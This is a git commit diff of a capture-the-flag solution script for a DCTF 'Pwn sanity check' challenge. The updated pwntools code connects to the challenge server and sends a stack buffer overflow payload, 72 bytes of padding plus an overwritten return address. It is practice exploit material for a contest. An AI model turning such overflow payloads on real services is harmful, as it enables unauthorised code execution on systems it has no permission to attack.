258ea6a291aaf2e3d62e948a372d5050b60d4472
Vincent550102 <5020559@gmail.com>
2021-05-20 00:56:51 +0800

    upd

--- solo/dctf/Pwnsanitycheck/sol.py
+++ solo/dctf/Pwnsanitycheck/sol.py
@@ -3,7 +3,7 @@ from pwn import *
 r = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)
 r.recvline()
 
-p = 'a'*60+p64(3735929054)
+p = 'a'*72+p64(0x4006cf)
 
 r.send(p)
 r.interactive()
